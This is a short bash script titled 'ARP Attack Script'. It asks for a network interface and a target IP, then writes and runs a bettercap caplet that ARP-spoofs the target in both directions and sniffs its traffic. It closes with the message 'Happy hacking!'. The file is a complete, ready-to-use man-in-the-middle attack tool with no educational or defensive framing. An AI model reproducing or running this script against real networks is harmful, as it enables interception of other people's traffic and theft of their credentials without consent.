#!/bin/bash

# Function to display a banner
function show_banner() {
    echo "====================================="
    echo "          ARP Attack Script          "
    echo "====================================="
}

# Function to check if the command executed successfully
function check_status() {
    if [ $? -eq 0 ]; then
        echo -e "\e[32m[+]\e[0m $1 successfully executed."
    else
        echo -e "\e[31m[-]\e[0m $1 failed."
        exit 1
    fi
}

# Display the banner
show_banner

# Prompt the user for the network interface
read -p "Enter the network interface (e.g., eth0): " iface
echo -e "\nNetwork interface set to: \e[34m$iface\e[0m"

# Prompt the user for the target IP address
read -p "Enter the target IP address: " target_ip
echo -e "\nTarget IP set to: \e[34m$target_ip\e[0m"

# Create a caplet file in /tmp with .cap extension
caplet_file="/tmp/arp_attack.cap"
cat > "$caplet_file" <<EOF
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets $target_ip
arp.spoof on
net.sniff on
EOF

# Ensure the caplet file is created
if [ ! -f "$caplet_file" ]; then
    echo -e "\e[31m[-]\e[0m Caplet file could not be created."
    exit 1
fi

# Start bettercap with the specified interface and caplet
echo "Starting bettercap on interface $iface..."
bettercap -iface $iface -caplet "$caplet_file"
check_status "Bettercap execution"

# Clean up the caplet file after use
rm -f "$caplet_file"

# Display a completion message
echo -e "\n\e[32m[+]\e[0m ARP attack initiated against \e[34m$target_ip\e[0m on interface \e[34m$iface\e[0m. Happy hacking!"
